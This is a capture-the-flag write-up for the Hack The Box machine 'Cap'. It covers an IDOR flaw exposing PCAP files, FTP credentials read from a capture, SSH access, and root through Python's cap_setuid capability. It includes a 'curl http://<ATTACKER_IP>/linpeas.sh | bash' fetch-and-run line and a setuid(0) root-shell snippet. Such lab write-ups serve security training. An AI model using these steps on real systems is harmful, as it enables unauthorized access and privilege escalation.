### **HTB Machine "Cap" Write-up**

#### **1. Machine Overview**
- **Difficulty**: Easy (Linux)
- **Key Services**: HTTP (Network Capture Tool), FTP, SSH
- **Critical Vulnerabilities**: IDOR → Cleartext Credentials → CAP_SETUID Privilege Escalation

#### **2. Attack Summary**
1. **Enumeration**: Nmap scan reveals open ports (21/FTP, 22/SSH, 80/HTTP).
2. **IDOR Exploit**: Parameter tampering to download unauthorized PCAPs.
3. **PCAP Analysis**: FTP/SSH credentials disclosure.
4. **Foothold**: SSH access using stolen credentials.
5. **Privilege Escalation**: Exploiting Python's `CAP_SETUID` capability.

---

#### **3. IDOR Vulnerability: Technical Details**
**Definition**:  
Insecure Direct Object Reference (IDOR) allows unauthorized resource access by manipulating object identifiers.

**Practical Example**:  
```
http://10.10.10.56/data/[ID]
```
Modifying `[ID]` (e.g., from 2 to 1/3) enables downloading other users' PCAPs.

**Impact**:  
- FTP credentials exposure: `user:password123!` 
- Network sensitive data leakage

**Prevention**:  
- Implement server-side authorization checks
- Use non-sequential UUIDs
- Encrypt network traffic (e.g., SFTP instead of FTP)

---

#### **4. Exploit Walkthrough**

**Step 1: Initial Scanning**  
```bash
nmap -sV -Pn 10.10.10.56
```
**Findings**:  
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1
80/tcp open  http    gunicorn
```

**Step 2: IDOR Discovery**  
1. Visit `http://10.10.10.56/data/2`
2. Manually tamper with ID parameter:
   ```
   http://10.10.10.56/data/1 → Another user's PCAP
   ```

**Step 3: PCAP Analysis with Wireshark**  
- FTP filter: `ftp.request.command == "PASS"`
- Exposed credentials:  
  ```
  USER: utente
  PASS: password123!
  ```

**Step 4: SSH Access**  
```bash
ssh utente@10.10.10.56
```

---

#### **5. Privilege Escalation (CAP_SETUID)**
**Vulnerability Identification**:  
```bash
# Creating an HTTP server that serves the contents of the current directory on
# the attacking machine where I downloaded linpeas.sh
python -m http.server 80

# Run linPEAS
curl http://<ATTACKER_IP>/linpeas.sh | bash
```
**Critical Finding**:  
```
╔══════════╣ Capabilities
/usr/bin/python3.8 = cap_setuid+ep
```

**Python Exploit**:  
```python
import os
os.setuid(0)  # Set UID to root (0)
os.system("/bin/bash")
```
**Result**:  
```
root@cap:/home/utente# id
uid=0(root) gid=1000(utente)
```

---

#### **6. Security Recommendations**
1. **FTP**: Replace with SFTP/FTPS
2. **IDOR**: Implement authorization checks
3. **Capabilities**: Remove `CAP_SETUID` from Python
